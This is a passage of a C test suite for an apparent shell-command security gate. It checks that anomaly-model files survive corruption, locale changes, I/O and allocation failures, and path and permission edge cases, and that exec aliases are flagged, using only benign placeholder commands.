  sg_gate_t *invalid = sg_gate_new();
  ASSERT(invalid != NULL);
  ASSERT(sg_gate_save_anomaly_model(invalid, path) == SG_ERR_INVALID);
  ASSERT(sg_gate_load_anomaly_model(invalid, path) == SG_ERR_INVALID);
  ASSERT(sg_gate_enable_anomaly(invalid, 100.0, NULL) == SG_OK);
  ASSERT(eval_cmd(invalid, "one ; two ; three ; four", &actual) == SG_OK);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(invalid), 4);

  /* Gate persistence intentionally rejects standalone single-model files. */
  sg_anomaly_model_t *legacy = sg_anomaly_model_new();
  ASSERT(legacy != NULL);
  const char legacy_seq[] = "3:one,3:two,5:three,";
  ASSERT(sg_anomaly_model_update_netseq(
             legacy, legacy_seq, sizeof(legacy_seq) - 1) == SG_ANOMALY_OK);
  ASSERT(sg_anomaly_model_save(legacy, path) == SG_ANOMALY_OK);
  sg_anomaly_model_free(legacy);
  ASSERT(sg_gate_load_anomaly_model(invalid, path) == SG_ERR_PARSE);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(invalid), 4);

  char missing_path[256];
  snprintf(missing_path, sizeof(missing_path), "/tmp/shellgate_missing_%d",
           getpid());
  unlink(missing_path);
  ASSERT(sg_gate_load_anomaly_model(invalid, missing_path) == SG_ERR_IO);
  sg_gate_free(invalid);
  sg_gate_free(g2);
  sg_gate_free(g);
}

/* v7 permits the empty raw stage used for an argv-less redirect-only simple
 * command. Exercise it through Shellgate's paired-model bundle rather than
 * only through the lower-level anomaly model serializer. */
TEST(anomaly_bundle_roundtrip_retains_empty_stage) {
  static const char *training =
      "echo ok; >/tmp/shellgate-roundtrip-empty-stage; sort";
  static const char *probe =
      "echo next; >/tmp/shellgate-roundtrip-empty-stage; sort";
  sg_gate_t *source = sg_gate_new();
  sg_gate_t *loaded = sg_gate_new();
  ASSERT(source != NULL && loaded != NULL);
  sg_anomaly_config_t config;
  sg_anomaly_config_default(&config);
  config.alpha = DBL_MAX;
  ASSERT_SG_OK(sg_gate_enable_anomaly(source, 100.0, &config));
  ASSERT_SG_OK(sg_gate_enable_anomaly(loaded, 100.0, NULL));

  sg_result_t result = {0};
  for (size_t i = 0; i < 30; i++)
    ASSERT_SG_OK(eval_cmd(source, training, &result));
  ASSERT_EQ_UINT(test_anomaly_vocabulary(source), 3);

  shell_netstring_buffer_t raw = {0};
  shell_netstring_buffer_t typed = {0};
  size_t stage_count = 0;
  ASSERT(shell_build_anomaly_netseqs_buffer(probe, strlen(probe), NULL, &raw,
                                            &typed,
                                            &stage_count) == SHELL_PROCESS_OK);
  ASSERT(stage_count == 3);
  ASSERT((raw.length != sizeof("4:echo,0:,4:sort,") - 1 ||
          memcmp(raw.data, "4:echo,0:,4:sort,", raw.length)) == 0);

  sg_anomaly_sequence_score_t expected = {0};
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(
      source, (const char *)raw.data, raw.length, (const char *)typed.data,
      typed.length, &expected));
  ASSERT(expected.stage_count == 3 && isfinite(expected.raw_score) &&
         isfinite(expected.type_score) && isfinite(expected.combined_score));

  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  ASSERT_SG_OK(sg_gate_save_anomaly_model(source, path));
  ASSERT_SG_OK(sg_gate_load_anomaly_model(loaded, path));
  ASSERT_EQ_UINT(test_anomaly_vocabulary(loaded),
                 test_anomaly_vocabulary(source));

  sg_anomaly_sequence_score_t actual = {0};
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(
      loaded, (const char *)raw.data, raw.length, (const char *)typed.data,
      typed.length, &actual));
  ASSERT(actual.stage_count == expected.stage_count);
  ASSERT(actual.raw_score == expected.raw_score);
  ASSERT(actual.type_score == expected.type_score);
  ASSERT(actual.combined_score == expected.combined_score);

  shell_netstring_buffer_free(&typed);
  shell_netstring_buffer_free(&raw);
  sg_gate_free(loaded);
  sg_gate_free(source);
}

TEST(anomaly_bundle_corruption_matrix) {
  static const char *training = "cat /etc/hosts ; grep root ; sort";
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  sg_gate_t *source = sg_gate_new();
  sg_gate_t *target = sg_gate_new();
  ASSERT(source != NULL && target != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(source, 100.0, NULL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(target, 100.0, NULL));
  sg_result_t result;
  for (int i = 0; i < 8; i++)
    ASSERT_SG_OK(eval_cmd(source, training, &result));
  ASSERT_SG_OK(eval_cmd(target, "one ; two ; three ; four", &result));
  size_t preserved_vocab = test_anomaly_vocabulary(target);
  ASSERT_SG_OK(sg_gate_save_anomaly_model(source, path));

  FILE *file = fopen(path, "rb");
  ASSERT(file != NULL);
  ASSERT(fseek(file, 0, SEEK_END) == 0);
  long length = ftell(file);
  ASSERT(length > 32 && fseek(file, 0, SEEK_SET) == 0);
  unsigned char *valid = malloc((size_t)length + 1);
  unsigned char *data = malloc((size_t)length + 1);
  ASSERT(valid != NULL && data != NULL);
  ASSERT(fread(valid, 1, (size_t)length, file) == (size_t)length);
  ASSERT(fclose(file) == 0);

  enum corruption {
    BAD_MAGIC,
    BAD_LENGTH,
    BAD_CHECKSUM,
    BAD_INNER_HEADER,
    TRUNCATED,
    TRAILING
  };
  static const enum corruption cases[] = {BAD_MAGIC,    BAD_LENGTH,
                                          BAD_CHECKSUM, BAD_INNER_HEADER,
                                          TRUNCATED,    TRAILING};
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    memcpy(data, valid, (size_t)length);
    size_t write_length = (size_t)length;
    switch (cases[i]) {
    case BAD_MAGIC:
      data[0] ^= 0xff;
      break;
    case BAD_LENGTH:
      memset(data + 8, 0xff, 8);
      break;
    case BAD_CHECKSUM:
      data[24] ^= 1;
      break;
    case BAD_INNER_HEADER: {
      uint64_t raw_size = test_load_u64_le(data + 8);
      uint64_t type_size = test_load_u64_le(data + 16);
      ASSERT(raw_size <= (uint64_t)length - 32 &&
             type_size == (uint64_t)length - 32 - raw_size);
      static const unsigned char discount[] = {' ', '0', '.', '5', ' '};
      unsigned char *field = NULL;
      for (size_t offset = 32;
           offset + sizeof(discount) <= 32 + (size_t)raw_size; offset++) {
        if (memcmp(data + offset, discount, sizeof(discount)) == 0) {
          field = data + offset + 1;
          break;
        }
      }
      ASSERT(field != NULL);
      memcpy(field, "2.0", 3);
      test_store_u64_le(data + 24,
                        XXH3_64bits(data + 32, (size_t)(raw_size + type_size)));
      break;
    }
    case TRUNCATED:
      write_length--;
      break;
    case TRAILING:
      data[write_length++] = 'x';
      break;
    }
    file = fopen(path, "wb");
    ASSERT(file != NULL);
    ASSERT(fwrite(data, 1, write_length, file) == write_length);
    ASSERT(fclose(file) == 0);
    ASSERT(sg_gate_load_anomaly_model(target, path) == SG_ERR_PARSE);
    ASSERT_EQ_UINT(test_anomaly_vocabulary(target), preserved_vocab);
  }

  file = fopen(path, "wb");
  ASSERT(file != NULL);
  ASSERT(fwrite(valid, 1, (size_t)length, file) == (size_t)length);
  ASSERT(fclose(file) == 0);
  ASSERT_SG_OK(sg_gate_load_anomaly_model(target, path));
  ASSERT_EQ_UINT(test_anomaly_vocabulary(target),
                 test_anomaly_vocabulary(source));
  free(data);
  free(valid);
  sg_gate_free(target);
  sg_gate_free(source);
}

TEST(anomaly_bundle_inner_header_framing) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  sg_gate_t *source = sg_gate_new();
  sg_gate_t *target = sg_gate_new();
  ASSERT(source && target);
  ASSERT_SG_OK(sg_gate_enable_anomaly(source, 100.0, NULL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(target, 100.0, NULL));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(target, "one; two; three; four", &result));
  size_t vocab = test_anomaly_vocabulary(target);
  shell_netstring_buffer_t raw = {0};
  shell_netstring_buffer_t typed = {0};
  size_t stages = 0;
  const char *command = "one; two; three; four";
  ASSERT(shell_build_anomaly_netseqs_buffer(command, strlen(command), NULL,
                                            &raw, &typed,
                                            &stages) == SHELL_PROCESS_OK);
  sg_anomaly_sequence_score_t before = {0};
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(
      target, (const char *)raw.data, raw.length, (const char *)typed.data,
      typed.length, &before));
  /* Empty models end immediately after the numeric header, allowing inner
   * EOF truncation without accidentally consuming a following record. */
  ASSERT_SG_OK(sg_gate_save_anomaly_model(source, path));
  FILE *file = fopen(path, "rb");
  ASSERT(file != NULL);
  ASSERT(fseek(file, 0, SEEK_END) == 0);
  long file_length = ftell(file);
  ASSERT(file_length > 32 && fseek(file, 0, SEEK_SET) == 0);
  size_t length = (size_t)file_length;
  unsigned char *valid = malloc(length);
  unsigned char *data = malloc(length + 300);
  ASSERT(valid && data);
  ASSERT(fread(valid, 1, length, file) == length && fclose(file) == 0);
  uint64_t original_raw = test_load_u64_le(valid + 8);
  uint64_t original_type = test_load_u64_le(valid + 16);
  ASSERT(original_raw + original_type == length - 32);
  for (unsigned inner = 0; inner < 2; inner++) {
    for (unsigned corruption = 0; corruption < 4; corruption++) {
      memcpy(data, valid, length);
      size_t start = 32 + (inner ? (size_t)original_raw : 0);
      size_t end = start + (size_t)(inner ? original_type : original_raw);
      size_t numeric = start;
      while (numeric < end && data[numeric] != '\n')
        numeric++;
      ASSERT(numeric < end && data[end - 1] == '\n');
      numeric++; /* numeric header begins after the version line */
      size_t write_length = length;
      uint64_t raw_size = original_raw, type_size = original_type;
      uint64_t *inner_size = inner ? &type_size : &raw_size;
      if (corruption == 0) {
        static const unsigned char hidden[] = "\0 hidden bytes";
        size_t added = sizeof(hidden) - 1;
        memmove(data + end - 1 + added, data + end - 1, length - end + 1);
        memcpy(data + end - 1, hidden, added);
        write_length += added;
        *inner_size += added;
      } else if (corruption == 1) {
        memmove(data + end - 1, data + end, length - end);
        write_length--;
        (*inner_size)--;
      } else if (corruption == 2) {
        data[end - 1] = '\r'; /* truncated CRLF */
      } else {
        memmove(data + numeric + 1 + 256, data + numeric + 1,
                length - numeric - 1);
        memset(data + numeric + 1, ' ', 256);
        write_length += 256;
        *inner_size += 256;
      }
      test_store_u64_le(data + 8, raw_size);
      test_store_u64_le(data + 16, type_size);
      test_store_u64_le(data + 24, XXH3_64bits(data + 32, write_length - 32));
      file = fopen(path, "wb");
      ASSERT(file != NULL);
      ASSERT(fwrite(data, 1, write_length, file) == write_length);
      ASSERT(fclose(file) == 0);
      ASSERT_EQ_INT(sg_gate_load_anomaly_model(target, path), SG_ERR_PARSE);
      ASSERT_EQ_UINT(test_anomaly_vocabulary(target), vocab);
      sg_anomaly_sequence_score_t after = {0};
      ASSERT_SG_OK(sg_gate_score_anomaly_netseq(
          target, (const char *)raw.data, raw.length, (const char *)typed.data,
          typed.length, &after));
      ASSERT(before.raw_score == after.raw_score &&
             before.type_score == after.type_score &&
             before.combined_score == after.combined_score &&
             before.detected == after.detected && after.stage_count == stages);
    }
  }
  free(data);
  free(valid);
  shell_netstring_buffer_free(&typed);
  shell_netstring_buffer_free(&raw);
  sg_gate_free(target);
  sg_gate_free(source);
}

static bool bundle_locale_roundtrip(sg_gate_t *source, sg_gate_t *target,
                                    const char *path, locale_t writer,
                                    locale_t reader,
                                    const shell_netstring_buffer_t *raw,
                                    const shell_netstring_buffer_t *typed,
                                    sg_anomaly_sequence_score_t expected) {
  locale_t previous = uselocale(writer);
  sg_error_t status = sg_gate_save_anomaly_model(source, path);
  bool ok = status == SG_OK && uselocale((locale_t)0) == writer;
  uselocale(reader);
  if (ok) {
    status = sg_gate_load_anomaly_model(target, path);
    ok = status == SG_OK && uselocale((locale_t)0) == reader;
  }
  sg_anomaly_sequence_score_t actual = {0};
  if (ok) {
    status = sg_gate_score_anomaly_netseq(
        target, (const char *)raw->data, raw->length, (const char *)typed->data,
        typed->length, &actual);
    ok = status == SG_OK && actual.raw_score == expected.raw_score &&
         actual.type_score == expected.type_score &&
         actual.combined_score == expected.combined_score &&
         actual.detected == expected.detected &&
         actual.stage_count == expected.stage_count;
  }
  /* Locale setup failures must preserve both the existing file and gate. */
  if (ok) {
    sg_test_locale_fail_with_errno(ENOMEM);
    status = sg_gate_save_anomaly_model(source, path);
    ok = status == SG_ERR_MEMORY && uselocale((locale_t)0) == reader;
  }
  if (ok) {
    sg_test_locale_fail_with_errno(ENOMEM);
    status = sg_gate_load_anomaly_model(target, path);
    ok = status == SG_ERR_MEMORY && uselocale((locale_t)0) == reader;
  }
  if (ok) {
    status = sg_gate_score_anomaly_netseq(
        target, (const char *)raw->data, raw->length, (const char *)typed->data,
        typed->length, &actual);
    ok = status == SG_OK && actual.raw_score == expected.raw_score &&
         actual.type_score == expected.type_score &&
         actual.combined_score == expected.combined_score;
  }
  if (ok)
    ok = sg_gate_load_anomaly_model(target, path) == SG_OK;
  uselocale(previous);
  return ok;
}

TEST(anomaly_bundle_locale_independence) {
  locale_t comma = sg_test_comma_locale();
  if (!comma)
    return;
  locale_t numeric = newlocale(LC_NUMERIC_MASK, "C", (locale_t)0);
  ASSERT(numeric != (locale_t)0);
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  sg_gate_t *source = sg_gate_new();
  sg_gate_t *target = sg_gate_new();
  ASSERT(source && target);
  ASSERT_SG_OK(sg_gate_enable_anomaly(source, 100.0, NULL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(target, 100.0, NULL));
  sg_result_t result = {0};
  const char *command = "cat a; grep b; sort; echo done";
  for (unsigned i = 0; i < 4; i++)
    ASSERT_SG_OK(eval_cmd(source, command, &result));
  shell_netstring_buffer_t raw = {0};
  shell_netstring_buffer_t typed = {0};
  size_t stages = 0;
  ASSERT(shell_build_anomaly_netseqs_buffer(command, strlen(command), NULL,
                                            &raw, &typed,
                                            &stages) == SHELL_PROCESS_OK);
  sg_anomaly_sequence_score_t expected = {0};
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(
      source, (const char *)raw.data, raw.length, (const char *)typed.data,
      typed.length, &expected));
  bool ok = bundle_locale_roundtrip(source, target, path, comma, comma, &raw,
                                    &typed, expected);
  ok = bundle_locale_roundtrip(source, target, path, comma, numeric, &raw,
                               &typed, expected) &&
       ok;
  ok = bundle_locale_roundtrip(source, target, path, numeric, comma, &raw,
                               &typed, expected) &&
       ok;
  shell_netstring_buffer_free(&typed);
  shell_netstring_buffer_free(&raw);
  sg_gate_free(target);
  sg_gate_free(source);
  freelocale(numeric);
  freelocale(comma);
  ASSERT(ok);
}

TEST(anomaly_bundle_failure_atomicity) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  char stale_path[320];
  ASSERT(snprintf(stale_path, sizeof(stale_path), "%s.stale", path) > 0);
  FILE *stale = fopen(stale_path, "wb");
  ASSERT(stale != NULL);
  ASSERT(fputs("incomplete anomaly bundle", stale) >= 0);
  ASSERT(fclose(stale) == 0);
  register_temp_file(stale_path);
  sg_gate_t *first = sg_gate_new();
  sg_gate_t *second = sg_gate_new();
  ASSERT(first != NULL && second != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(first, 100.0, NULL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(second, 100.0, NULL));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(first, "one ; two ; three", &result));
  ASSERT_SG_OK(eval_cmd(second, "one ; two ; three ; four", &result));
  size_t first_vocab = test_anomaly_vocabulary(first);
  size_t second_vocab = test_anomaly_vocabulary(second);
  ASSERT(first_vocab != second_vocab);

  sg_test_io_reset();
  ASSERT_SG_OK(sg_gate_save_anomaly_model(second, path));
  size_t io_operations = sg_test_io_count();
  sg_test_io_reset();
  ASSERT(io_operations > 0);

  for (size_t i = 1; i <= io_operations; i++) {
    ASSERT_SG_OK(sg_gate_save_anomaly_model(first, path));
    sg_test_io_fail_at(i);
    ASSERT(sg_gate_save_anomaly_model(second, path) == SG_ERR_IO);
    sg_test_io_reset();
    ASSERT(access(stale_path, F_OK) == 0);

    sg_gate_t *loaded = sg_gate_new();
    ASSERT(loaded != NULL);
    ASSERT_SG_OK(sg_gate_enable_anomaly(loaded, 100.0, NULL));
    ASSERT_SG_OK(sg_gate_load_anomaly_model(loaded, path));
    size_t loaded_vocab = test_anomaly_vocabulary(loaded);
    /* A post-rename directory-sync failure may report I/O after the complete
     * replacement became visible. Either generation is valid; a partial one
     * is never visible. */
    ASSERT(loaded_vocab == first_vocab || loaded_vocab == second_vocab);
    sg_gate_free(loaded);
  }

  ASSERT(chmod(path, 0640) == 0);
  ASSERT_SG_OK(sg_gate_save_anomaly_model(second, path));
  ASSERT(access(stale_path, F_OK) == 0);
  struct stat status;
  ASSERT(stat(path, &status) == 0);
  ASSERT((status.st_mode & 0777) == 0640);

  sg_test_alloc_fail_at(1);
  ASSERT(sg_gate_save_anomaly_model(first, path) == SG_ERR_MEMORY);
  sg_test_alloc_reset();
  sg_gate_t *preserved = sg_gate_new();
  ASSERT(preserved != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(preserved, 100.0, NULL));
  ASSERT_SG_OK(sg_gate_load_anomaly_model(preserved, path));
  ASSERT_EQ_UINT(test_anomaly_vocabulary(preserved), second_vocab);
  sg_gate_free(preserved);
  sg_gate_free(second);
  sg_gate_free(first);
}

TEST(anomaly_bundle_path_and_mode_boundaries) {
  test_atomic_long_directory_t directory = {0};
  sg_gate_t *source = sg_gate_new();
  sg_gate_t *loaded = sg_gate_new();
  sg_result_t result;
  bool ok = source && loaded;
  if (ok)
    ok = sg_gate_enable_anomaly(source, 100.0, NULL) == SG_OK &&
         sg_gate_enable_anomaly(loaded, 100.0, NULL) == SG_OK &&
         eval_cmd(source, "one; two; three; four", &result) == SG_OK;
  static const char sequence[] = "3:one,3:two,5:three,4:four,";
  sg_anomaly_sequence_score_t before, after;
  if (ok)
    ok = sg_gate_score_anomaly_netseq(source, sequence, sizeof(sequence) - 1,
                                      sequence, sizeof(sequence) - 1,
                                      &before) == SG_OK;
  static const char *const roots[] = {"/tmp/shellclave-long-bundle-XXXXXX",
                                      "shellclave-long-bundle-XXXXXX"};
  const size_t lengths[] = {PATH_MAX - 12, PATH_MAX - 3, PATH_MAX - 2,
                            PATH_MAX - 1};
  const mode_t modes[] = {0640, 0750, 04750, 02750, 01750};
  for (size_t r = 0; ok && r < sizeof(roots) / sizeof(roots[0]); r++) {
    for (size_t l = 0; ok && l < sizeof(lengths) / sizeof(lengths[0]); l++) {
      ok = test_atomic_long_directory_create(&directory, roots[r], lengths[l]);
      if (!ok)
        break;
      char path[PATH_MAX + 2];
      memcpy(path, directory.path, lengths[l]);
      memcpy(path + lengths[l], "/x", 3);
      if (lengths[l] + 2 >= PATH_MAX) {
        size_t vocabulary = test_anomaly_vocabulary(loaded);
        for (unsigned existing = 0; ok && existing < 2; existing++) {
          if (existing)
            ok = test_atomic_directory_sentinel(directory.path, true);
          if (ok) {
            errno = 0;
            ok = sg_gate_save_anomaly_model(source, path) == SG_ERR_IO &&
                 errno == ENAMETOOLONG &&
                 test_atomic_directory_only_entry(directory.path,
                                                  existing ? "x" : NULL);
          }
          if (ok && existing)
            ok = test_atomic_directory_sentinel(directory.path, false);
        }
        if (ok)
          ok = sg_gate_load_anomaly_model(loaded, path) == SG_ERR_IO &&
               test_anomaly_vocabulary(loaded) == vocabulary &&
               sg_gate_score_anomaly_netseq(
                   loaded, sequence, sizeof(sequence) - 1, sequence,
                   sizeof(sequence) - 1, &after) == SG_OK &&
               after.raw_score == before.raw_score &&
               after.type_score == before.type_score &&
               after.combined_score == before.combined_score;
        ok = test_atomic_long_directory_cleanup(&directory) && ok;
        continue;
      }
      ok = sg_gate_save_anomaly_model(source, path) == SG_OK;
      struct stat status;
      if (ok)
        ok = stat(path, &status) == 0 && (status.st_mode & 07777) == 0600;
      for (size_t m = 0; ok && m < sizeof(modes) / sizeof(modes[0]); m++) {
        ok = chmod(path, modes[m]) == 0 &&
             sg_gate_save_anomaly_model(source, path) == SG_OK &&
             stat(path, &status) == 0 && (status.st_mode & 07777) == modes[m] &&
             test_atomic_temp_files(path, false) &&
             sg_gate_load_anomaly_model(loaded, path) == SG_OK &&
             test_anomaly_vocabulary(loaded) ==
                 test_anomaly_vocabulary(source) &&
             sg_gate_score_anomaly_netseq(
                 loaded, sequence, sizeof(sequence) - 1, sequence,
                 sizeof(sequence) - 1, &after) == SG_OK &&
             after.raw_score == before.raw_score &&
             after.type_score == before.type_score &&
             after.combined_score == before.combined_score;
      }
      ok = test_atomic_long_directory_cleanup(&directory) && ok;
    }
  }
  ok = test_atomic_long_directory_cleanup(&directory) && ok;
  sg_gate_free(loaded);
  sg_gate_free(source);
  ASSERT(ok);
}

TEST(anomaly_bundle_load_allocation_failure) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  sg_gate_t *source = sg_gate_new();
  ASSERT(source != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(source, 100.0, NULL));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(source, "cat a ; grep b ; sort", &result));
  ASSERT_SG_OK(sg_gate_save_anomaly_model(source, path));

  sg_gate_t *probe = sg_gate_new();
  ASSERT(probe != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(probe, 100.0, NULL));
  sg_test_alloc_reset();
  ASSERT_SG_OK(sg_gate_load_anomaly_model(probe, path));
  size_t allocation_count = sg_test_alloc_count();
  sg_test_alloc_reset();
  sg_gate_free(probe);
  ASSERT(allocation_count > 0);

  for (size_t i = 1; i <= allocation_count; i++) {
    sg_gate_t *target = sg_gate_new();
    ASSERT(target != NULL);
    ASSERT_SG_OK(sg_gate_enable_anomaly(target, 100.0, NULL));
    ASSERT_SG_OK(eval_cmd(target, "one ; two ; three ; four", &result));
    size_t preserved_vocab = test_anomaly_vocabulary(target);
    sg_test_alloc_fail_at(i);
    ASSERT(sg_gate_load_anomaly_model(target, path) == SG_ERR_MEMORY);
    sg_test_alloc_reset();
    ASSERT_EQ_UINT(test_anomaly_vocabulary(target), preserved_vocab);
    sg_gate_free(target);
  }
  sg_gate_free(source);
}

TEST(anomaly_bundle_save_temporary_stream_error_mapping) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  sg_gate_t *source = sg_gate_new();
  ASSERT(source != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(source, 100.0, NULL));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(source, "cat a ; grep b ; sort", &result));
  sg_test_io_reset();
  ASSERT_SG_OK(sg_gate_save_anomaly_model(source, path));

  static const struct {
    int error_number;
    sg_error_t expected;
  } failures[] = {{ENOMEM, SG_ERR_MEMORY}, {EIO, SG_ERR_IO}};
  for (size_t i = 0; i < sizeof(failures) / sizeof(failures[0]); i++) {
    for (size_t temporary = 1; temporary <= 2; temporary++) {
      sg_test_io_fail_at_with_errno(temporary, failures[i].error_number);
      ASSERT(sg_gate_save_anomaly_model(source, path) == failures[i].expected);
      sg_test_io_reset();
    }
  }

  sg_gate_t *loaded = sg_gate_new();
  ASSERT(loaded != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(loaded, 100.0, NULL));
  ASSERT_SG_OK(sg_gate_load_anomaly_model(loaded, path));
  ASSERT_EQ_UINT(test_anomaly_vocabulary(loaded),
                 test_anomaly_vocabulary(source));
  sg_gate_free(loaded);
  sg_gate_free(source);
}

TEST(anomaly_bundle_stream_failure_matrix) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  sg_gate_t *source = sg_gate_new();
  sg_gate_t *target = sg_gate_new();
  sg_gate_t *control = sg_gate_new();
  sg_gate_t *probe = sg_gate_new();
  ASSERT(source && target && control && probe);
  sg_gate_t *gates[] = {source, target, control, probe};
  for (size_t i = 0; i < 4; i++) {
    ASSERT_SG_OK(sg_gate_enable_anomaly(gates[i], 100.0, NULL));
    ASSERT_SG_OK(sg_gate_set_anomaly_cache_size(gates[i], 4));
    ASSERT_SG_OK(sg_gate_set_anomaly_adaptive(gates[i], true, 4));
  }
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(source, "cat a; grep b; sort", &result));
  for (size_t i = 0; i < 5; i++) {
    ASSERT_SG_OK(eval_cmd(target, "one; two; three; four", &result));
    ASSERT_SG_OK(eval_cmd(control, "one; two; three; four", &result));
  }
  size_t preserved_vocab = test_anomaly_vocabulary(target);
  shell_netstring_buffer_t raw = {0};
  shell_netstring_buffer_t typed = {0};
  size_t stages = 0;
  const char *command = "one; two; three; four";
  ASSERT(shell_build_anomaly_netseqs_buffer(command, strlen(command), NULL,
                                            &raw, &typed,
                                            &stages) == SHELL_PROCESS_OK);
  sg_anomaly_sequence_score_t expected = {0};
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(
      target, (const char *)raw.data, raw.length, (const char *)typed.data,
      typed.length, &expected));
  ASSERT_SG_OK(sg_gate_save_anomaly_model(source, path));
  sg_test_io_reset();
  ASSERT_SG_OK(sg_gate_load_anomaly_model(probe, path));
  size_t operations = sg_test_io_count();
  sg_test_io_reset();
  /* Includes both temporary streams, staging, EOF probe and inner readers;
   * unlike saving, loading does not create its temporary streams first. */
  ASSERT(operations > 12);
  static const int errors[] = {EIO, ENOMEM, EINVAL, EPROTO};
  for (size_t error = 0; error < sizeof(errors) / sizeof(errors[0]); error++) {
    for (size_t operation = 1; operation <= operations; operation++) {
      sg_test_io_fail_at_with_errno(operation, errors[error]);
      sg_error_t actual = sg_gate_load_anomaly_model(target, path);
      sg_test_io_reset();
      ASSERT(actual == (errors[error] == ENOMEM ? SG_ERR_MEMORY : SG_ERR_IO));
      ASSERT_EQ_UINT(test_anomaly_vocabulary(target), preserved_vocab);
      sg_anomaly_sequence_score_t score = {0};
      ASSERT_SG_OK(sg_gate_score_anomaly_netseq(
          target, (const char *)raw.data, raw.length, (const char *)typed.data,
          typed.length, &score));
      ASSERT(score.raw_score == expected.raw_score &&
             score.type_score == expected.type_score &&
             score.combined_score == expected.combined_score &&
             score.detected == expected.detected &&
             score.stage_count == stages);
    }
  }
  /* A normal cached evaluation after every failed load must agree with an
   * untouched gate, including adaptive detection and learning progression. */
  sg_result_t expected_result = {0};
  ASSERT_SG_OK(eval_cmd(control, command, &expected_result));
  double raw_score = expected_result.anomaly_score_raw;
  double type_score = expected_result.anomaly_score_type;
  double combined = expected_result.anomaly_score;
  bool detected = expected_result.anomaly_detected;
  sg_anomaly_update_t update = expected_result.anomaly_update;
  ASSERT_SG_OK(eval_cmd(target, command, &result));
  ASSERT(result.anomaly_score_raw == raw_score &&
         result.anomaly_score_type == type_score &&
         result.anomaly_score == combined &&
         result.anomaly_detected == detected &&
         result.anomaly_update == update);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(target),
                 test_anomaly_vocabulary(control));
  ASSERT_SG_OK(sg_gate_load_anomaly_model(target, path));
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(
      source, (const char *)raw.data, raw.length, (const char *)typed.data,
      typed.length, &expected));
  sg_anomaly_sequence_score_t score = {0};
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(
      target, (const char *)raw.data, raw.length, (const char *)typed.data,
      typed.length, &score));
  ASSERT(score.raw_score == expected.raw_score &&
         score.type_score == expected.type_score);
  shell_netstring_buffer_free(&raw);
  shell_netstring_buffer_free(&typed);
  for (size_t i = 0; i < 4; i++)
    sg_gate_free(gates[i]);
}

TEST(exec_returning_paths_consumer_violations) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "out";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t i = 0; i < sizeof(shellsplit_test_exec_continuations) /
                             sizeof(shellsplit_test_exec_continuations[0]);
       i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(
        eval_cmd(gate, shellsplit_test_exec_continuations[i].source, &result));
    bool found = false;
    for (uint32_t c = 0; c < result.subcommand_count; c++) {
      const sg_subcommand_result_t *command = &result.subcommands[c];
      if (strcmp(command->netargv, "6:printf,7:payload,"))
        continue;
      found = true;
      ASSERT(((command->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0) ==
             shellsplit_test_exec_continuations[i].writes);
    }
    ASSERT(found && !result.truncated);
  }
  sg_gate_free(gate);
}

TEST(exec_scalar_alias_preserves_effective_command) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  /* Harmless commands and an inert variable isolate executable-name analysis.
   * These fixtures are inspected only, never passed to a shell. */
  config.sensitive_env_names[0] = "TEST_MARKER";
  config.sensitive_env_name_count = 1;
  config.sensitive_cmd_names[0] = "/usr/bin/printf";
  config.sensitive_cmd_name_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  static const struct {
    const char *source;
    bool identified;
  } cases[] = {
      {"TEST_MARKER=value exec -a \"$label\" /usr/bin/printf ok", true},
      {"TEST_MARKER=value command exec -a \"$label\" /usr/bin/printf ok", true},
      {"TEST_MARKER=value exec -a\"prefix$label\" /usr/bin/printf ok", true},
      {"TEST_MARKER=value exec -a\"$label\" /usr/bin/printf ok", false},
      {"TEST_MARKER=value exec -a \"$label\" /usr/bin/true", false},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT(((result.violation_type_flags & SG_VIOL_ENV_PRIVILEGED) != 0) ==
